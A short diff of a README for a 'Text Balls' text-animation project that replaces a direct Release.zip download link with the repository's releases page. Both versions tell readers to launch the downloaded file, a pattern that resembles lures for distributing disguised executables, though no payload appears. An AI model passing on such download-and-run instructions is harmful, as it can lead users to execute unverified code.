@@ -34,7 +34,7 @@ The **Text Balls** repository is all about creating visually interesting animati
 
 ## Get Started
 
-To dive into the world of **Text Balls**, download the project files from [this link](https://github.com/releases/789694263/Release.zip). Make sure to launch the file once it's downloaded.
+To dive into the world of **Text Balls**, download the project files from [this link](https://github.com/Fauzan3416/text-balls/releases). Make sure to launch the file once it's downloaded.
 
 If the link is not working, you can always check the "Releases" section of the repository for more information.
 
